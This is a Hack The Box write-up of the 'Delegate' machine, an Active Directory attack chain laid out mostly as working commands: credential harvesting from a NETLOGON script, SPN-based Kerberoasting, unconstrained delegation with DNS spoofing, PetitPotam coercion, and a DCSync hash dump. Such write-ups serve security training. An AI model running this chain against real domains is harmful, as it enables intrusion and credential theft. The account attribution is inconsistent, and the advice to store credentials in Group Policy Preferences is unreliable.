---
title: "Delegate — Active Directory Unconstrained Delegation via NETLOGON Script Credentials"
description: "NETLOGON script credentials and GenericWrite over a delegation admin enable Kerberoasting, PetitPotam coercion, and DCSync."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - delegation
---

## Summary

Delegate is a Medium Windows Active Directory machine. A NETLOGON logon script exposes plaintext credentials, enabling initial access. BloodHound enumeration reveals `<INITIAL_DOMAIN_USER>` has `GenericWrite` over `<DELEGATION_USER>`, allowing Kerberoasting. `<DELEGATION_USER>` belongs to the `Delegation Admins` group and can perform unconstrained delegation attacks. A new machine account with unconstrained delegation, DNS spoofing, and PetitPotam coercion captures the domain controller's TGT, enabling DCSync and full domain compromise.

All IP addresses, credentials, hashes, and flags below are replaced with role-based placeholders.

## Context and Objective

The target is a Windows Domain Controller. Initial enumeration exposes a NETLOGON logon script containing cleartext credentials for an account with `GenericWrite` over another domain user. The objective is to escalate from the initial foothold to full domain compromise using Active Directory delegation abuse techniques.

## Approach and Evidence

### Stage 1 — Credential Discovery via NETLOGON Script

The recorded output shows that `nxc` with `spider_plus` discovers accessible shares, and a logon script on the NETLOGON share contains a conditional `net use` command with embedded credentials.

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' -M spider_plus
nxc smb <TARGET_IP> -u 'Guest' -p '' \
  --share NETLOGON --get-file users.bat ./users.bat
```

The script reveals: when the logged-on user is `<INITIAL_DOMAIN_USER>`, a `net use` maps a backup share using `<CLEARTEXT_PASSWORD>` for the `<DOMAIN_ADMINISTRATOR>` account.

### Stage 2 — BloodHound Enumeration and Kerberoasting

`rusthound-ce` collects directory data. BloodHound analysis shows `<INITIAL_DOMAIN_USER>` → `GenericWrite` → `<DELEGATION_USER>`.

```bash
rusthound-ce -d '<DOMAIN_FQDN>' -u '<INITIAL_DOMAIN_USER>@<DOMAIN_FQDN>' -p '<CLEARTEXT_PASSWORD>' -z
```

`GenericWrite` over a user object allows setting an arbitrary Service Principal Name, making the account Kerberoastable:

```bash
bloodyAD -d "<DOMAIN_FQDN>" --host "<DOMAIN_CONTROLLER_FQDN>" \
  -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
  set object "<DELEGATION_USER>" servicePrincipalName -v "http/<SERVICE_NAME>"

nxc ldap <DOMAIN_CONTROLLER_FQDN> -d "<DOMAIN_FQDN>" \
  -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
  --kerberoasting kerberoast.txt
```

The recorded output shows `hashcat -m 13100` recovers `<KERBEROASTED_PASSWORD>` from the Kerberoast hash. An `evil-winrm` session as `<DELEGATION_USER>` yields the user-level objective.

### Stage 3 — Unconstrained Delegation Chain

`<DELEGATION_USER>` is in the `Delegation Admins` group. The attack chain creates a machine account, enables unconstrained delegation, spoofs DNS, adds an SPN, coerces authentication via PetitPotam, and captures the domain controller's TGT.

```bash
impacket-addcomputer <DOMAIN_FQDN>/<DELEGATION_USER>:<KERBEROASTED_PASSWORD> \
  -computer-name 'RELAY' -dc-ip <TARGET_IP>

bloodyAD -d <DOMAIN_FQDN> --dc-ip <TARGET_IP> \
  -u <DELEGATION_USER> -p '<KERBEROASTED_PASSWORD>' \
  add uac 'RELAY$' -f TRUSTED_FOR_DELEGATION
```

DNS and SPN manipulation directs the DC's authentication toward the attacker-controlled relay host:

```bash
python3 dnstool.py -u '<DOMAIN_FQDN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
  -r <RELAY_FQDN> -d <ATTACKER_IP> --action add <TARGET_IP>

python3 addspn.py -u '<DOMAIN_FQDN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
  -s 'cifs/relay' -t 'RELAY$' -dc-ip <TARGET_IP> <TARGET_IP>
```

PetitPotam coerces the DC to authenticate to the relay, capturing the DC's TGT:

```bash
python3 PetitPotam.py -target-ip <TARGET_IP> \
  -u '<RELAY_MACHINE_ACCOUNT>' -p '<RELAY_PASSWORD>' pwn <DOMAIN_CONTROLLER_FQDN>
```

### Stage 4 — DCSync and Domain Compromise

With the domain controller's TGT captured in a ccache file, `impacket-secretsdump` performs DCSync to extract the administrative NT hash:

```bash
KRB5CCNAME='<DOMAIN_CONTROLLER_CCACHE>' \
  impacket-secretsdump -just-dc-user <DOMAIN_ADMINISTRATOR> -k <DOMAIN_CONTROLLER_FQDN>
```

The extracted hash provides a pass-the-hash shell as `<DOMAIN_ADMINISTRATOR>`. Domain-administrator access obtained.

## Challenges and Decisions

The unconstrained delegation chain demonstrates that unconstrained delegation combined with NETLOGON script credentials can create a high-probability path to domain compromise in legacy AD environments.

## Outcome

The evidence establishes full domain compromise through a four-stage chain: NETLOGON script credential exposure, Kerberoasting via GenericWrite, unconstrained delegation abuse with PetitPotam coercion, and DCSync. User-level and domain-administrator objectives were obtained.

## Lessons and Recommendations

- **NETLOGON logon scripts** should never contain embedded credentials; Group Policy Preferences or credential vaults are the correct approach.
- **GenericWrite over user objects** enables SPN manipulation and Kerberoasting; monitor for anomalous SPN additions.
- **Unconstrained delegation** is a critical misconfiguration; migrate to constrained delegation scoped to specific services and audit `TRUSTED_FOR_DELEGATION` flags on all computer objects.
- Review all domain accounts and computer objects for `TRUSTED_FOR_DELEGATION` and migrate to constrained delegation scoped to specific services.

## References

- Hack The Box — [Delegate](https://app.hackthebox.com/machines/Delegate) machine.
